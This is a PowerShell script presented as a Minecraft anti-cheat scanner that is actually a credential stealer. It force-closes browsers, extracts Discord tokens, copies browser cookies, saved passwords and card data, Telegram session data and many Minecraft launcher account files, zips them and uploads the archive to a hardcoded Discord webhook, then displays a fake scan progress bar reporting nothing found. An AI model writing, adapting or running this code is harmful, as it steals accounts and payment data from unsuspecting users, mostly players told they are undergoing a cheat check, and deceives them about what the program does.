Write-Output " by funtime-project & cheat.check.ru                      "
Write-Output "   ____ _                _      ____ _               _    "
Write-Output "  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __"
Write-Output " | |   | '_ \ / _ \/ _\ | __| | |   | '_ \ / _ \/ __| |/ /"
Write-Output " | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < "
Write-Output "  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\" 
Write-Output "                                                          "
Write-Output "Загрузка... / Loading...                                  "

### --- // Variables \\ --- ###
$userName = Split-Path $env:USERPROFILE -Leaf
$user = "C:\Users\$userName"
$roaming = "$user\AppData\Roaming"
$local = "$user\AppData\Local"
$temp = $env:TEMP
$Webhook_link = "https://discord.com/api/webhooks/1309222060622352525/At3gEpHBgU-ZbxyCRHiW0TuMOCDQxqLyqpiFEKenHjw3o6Ypb4ZvGvOcNQgWWcJ1AYv1"
$zipFilePath = Join-Path $env:Temp "yawsteal.zip"

### --- // Closing Processes \\ --- ###
$browsers = @(
    "browser",
    "msedge",
    "chrome"
)

foreach ($processName in $browsers) {
    Stop-Process -Name $processName -ErrorAction SilentlyContinue -Force
}

### --- // Paths \\ --- ###
$filePaths = @{
    ## --- // Other \\ --- ##
    "Discord" = @{
        "$temp\discord_tokens.txt" = "discord_tokens.txt"
    }

    "Telegram Desktop" = @{
        "$roaming\Telegram Desktop\tdata" = "tdata"
    }
    
    ## --- // Browsers \\ --- ##
    "Yandex (Hashed)" = @{
        "$local\Yandex\YandexBrowser\User Data\Default\Network\Cookies" = "yandex_cookies.txt"
        "$local\Yandex\YandexBrowser\User Data\Default\Ya Credit Cards" = "yandex_credit_cards.txt"
        "$localYandex\YandexBrowser\User Data\Default\Ya Passman Data" = "yandex_passwords.txt"
    }

    "Google Chrome" = @{
        "$local\Google\Chrome\User Data\Default\Network\Cookies" = "chrome_cookies.txt"
        "$local\Google\Chrome\User Data\Default\Login Data" = "chrome_passwords.txt"
        "$local\Google\Chrome\User Data\Local State" = "Local State"
    }

    "Microsoft Edge" = @{
        "$local\Microsoft\Edge\User Data\Default\Network\Cookies" = "edge_cookies.txt"
        "$local\Microsoft\Edge\User Data\Default\Login Data" = "edge_passwords.txt"
        "$local\Microsoft\Edge\User Data\Local State" = "Local State"
    }

    "Mozilla Firefox" = @{
        "$roaming\Mozilla\Firefox\Profiles\logins.json" = "mozilla_firefox_passwords.txt"
        "$roaming\Mozilla\Firefox\Profiles\Local State" = "Local State"
    }

    "Opera" = @{
        "$roaming\Opera Software\Opera GX Stable\Network\Cookies" = "opera_cookies.txt"
        "$roaming\Opera Software\Opera GX Stable\Cookies" = "opera_cookies.txt"
        "$roaming\Opera Software\Opera Stable\Login Data" = "opera_passwords.txt"
        "$roaming\Opera Software\Opera Stable\Local State" = "Local State"
    }

    "Opera GX" = @{
        "$roaming\Opera Software\Opera GX Stable\Network\Cookies" = "opera_cookies.txt"
        "$roaming\Opera Software\Opera GX Stable\Cookies" = "opera_gx_cookies.txt"
        "$roaming\Opera Software\Opera GX Stable\Login Data" = "opera_gx_passwords.txt"
        "$roaming\Opera Software\Opera GX Stable\Local State" = "Local State"
    }
    
    ## --- // Minecraft Clients \\ --- ##
    "Cristalix" = @{
        "$user\.cristalix\.launcher" = ".launcher.txt"
    }

    "Lunar Client" = @{
        "$user\.lunarclient\settings\game\accounts.json" = "accounts.json"
    }

    "Minecraft" = @{
        "$roaming\.minecraft\launcher_accounts_microsoft_store.json" = "launcher_accounts_microsoft_store.json"
    }

    "Intent Client" = @{
        "$user\intentlauncher\launcherconfig" = "launcherconfig.txt"
    }

    "TLauncher" = @{
        "$roaming\.minecraft\TlauncherProfiles.json" = "TlauncherProfiles.json"
    }

    "Feather Client" = @{
        "$roaming\.feather\accounts.json" = "accounts.json"
    }

    "Meteor Client" = @{
        "$roaming\.minecraft\meteor-client\accounts.nbt" = "accounts.nbt"
    }

    "Impact Client" = @{
        "$roaming\.minecraft\Impact\alts.json" = "alts.json"
    }

    "Novoline Client" = @{
        "$roaming\.minecraft\Novoline\alts.novo" = "alts.novo"
    }

    "CheatBreakers Client" = @{
        "$roaming\.minecraft\cheatbreaker_accounts.json" = "cheatbreaker_accounts.json"
    }

    "Rise Client" = @{
        "$roaming\.minecraft\Rise\alts.txt" = "alts.txt"
    }

    "Rise Client (Intent)" = @{
        "$user\intentlauncher\Rise\alts.txt" = "alts.txt"
    }

    "Paladium Client" = @{
        "$roaming\paladium-group\accounts.json" = "accounts.json"
    }

    "PolyMC Client" = @{
        "$roaming\PolyMC\accounts.json" = "accounts.json"
    }

    "Badlion Client" = @{
        "$roaming\Badlion Client\accounts.json" = "accounts.json"
    }
}

### --- // Discord \\ --- ###
$dsc_targets = @(
    "$env:APPDATA\Discord",
    "$env:APPDATA\discordcanary",
    "$env:APPDATA\discordptb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default"
)

$dsc_regexes = @(
    "[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
    "mfa\.[\w-]{84}"
)

$dsc_tokens = @()

foreach ($target in $dsc_targets) {
    $leveldbPath = Join-Path $target "Local Storage\leveldb"

    if (Test-Path $leveldbPath) {
        Get-ChildItem -Path $leveldbPath -Filter "*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $fileContent = Get-Content $_.FullName -Raw
            foreach ($regex in $dsc_regexes) {
                $matches = [regex]::Matches($fileContent, $regex)
                foreach ($match in $matches) {
                    $dsc_tokens += $match.Value
                }
            }
        }

        Get-ChildItem -Path $leveldbPath -Filter "*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $fileContent = Get-Content $_.FullName -Raw
            foreach ($regex in $dsc_regexes) {
                $matches = [regex]::Matches($fileContent, $regex)
                foreach ($match in $matches) {
                    $dsc_tokens += $match.Value
                }
            }
        }
    }
}

if ($dsc_tokens -and $dsc_tokens.Count -gt 0) {
    $filePath = Join-Path $env:Temp "discord_tokens.txt"
    $dsc_tokens | Out-File -FilePath $filePath -Encoding UTF8
}


### --- // Process \\ --- ###

## --- // Zip Archive & Temp Folder Creating \\ --- ##
if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}

$tempFolder = Join-Path $env:Temp "tempZipFolder"
if (Test-Path $tempFolder) {
    Remove-Item $tempFolder -Recurse -Force
}
New-Item -ItemType Directory -Path $tempFolder | Out-Null

## --- // foreach paths \\ --- ##
$totalFiles = 0;
foreach ($folderName in $filePaths.Keys) {
    $paths = $filePaths[$folderName] # "@{paths}"
    $folderName = $folderName + "\"
    foreach ($filePath in $paths.Keys) {
        $copyName = $paths[$filePath] # "accounts.json"
        if (Test-Path $filePath) {
            try {
                $folderPath = Join-Path -Path $tempFolder -ChildPath $folderName
                if (Test-Path $folderPath) {} else {
                    New-Item -ItemType Directory -Path $folderPath | Out-Null
                }
                $destinationPath = Join-Path -Path $folderPath -ChildPath $copyName
                Copy-Item -Path $filePath -Destination $folderPath -Force
                $totalFiles = $totalFiles + 1
            } catch {
                #Write-Warning "Ошибка копирования файла '$filePath': $_"
            }
        } else {
            #Write-Warning "Файл '$filePath' не найден по такому пути"
        }
    }
}
$totalName = "Всего спизженно файлов — " + $totalFiles
$totalPath = Join-Path -Path $tempFolder -ChildPath $totalName
New-Item -ItemType File -Path $totalPath | Out-Null


try {
    Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipFilePath -Force
} catch {
    return
}


## --- // Discord Webhook \\ --- ##
try {
    Add-Type -AssemblyName System.Net.Http
    $httpClient = New-Object System.Net.Http.HttpClient
    $formData = New-Object System.Net.Http.MultipartFormDataContent

    $stringContent = New-Object System.Net.Http.StringContent("> Кто-то попался в ловушечку Ю_ю")
    $formData.Add($stringContent, "content")

    $fileStream = [System.IO.File]::OpenRead($zipFilePath)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
    $formData.Add($fileContent, "file", $userName + "_data.zip")

    $response = $httpClient.PostAsync($Webhook_link, $formData).Result

    if (-Not $response.IsSuccessStatusCode) {
        Write-Error "Failed to send ZIP archive. HTTP status: $($response.StatusCode)"
    }
} catch {
    Write-Error "Error sending ZIP archive: $_"
}


## --- // Ending & Visual \\ --- ##
Remove-Item $zipFilePath -Force
Remove-Item "$env:TEMP\discord_tokens.txt" -Force
Write-Output "———————————————————————————————————————————————————————————"
Write-Output " "
Write-Output " @ Current task:    Scanning C:\ for Doomsday"
$progressBarLength = 50
$i = 0
for (; $i -le $progressBarLength; $i++) {
    $progressBar = "[" + ("=" * $i).PadRight($progressBarLength) + "]"
    Write-Host -NoNewline "`r$progressBar ($([math]::Round(($i / $progressBarLength) * 100)))%"
    Start-Sleep -Milliseconds 200
}
Write-Output " "
Write-Output "———————————————————————————————————————————————————————————"

Write-Output " "
Write-Warning "Stopped. Doomsday и прочие скрытые ПО не найдены"

Pause
Start-Sleep -Seconds 2
exit
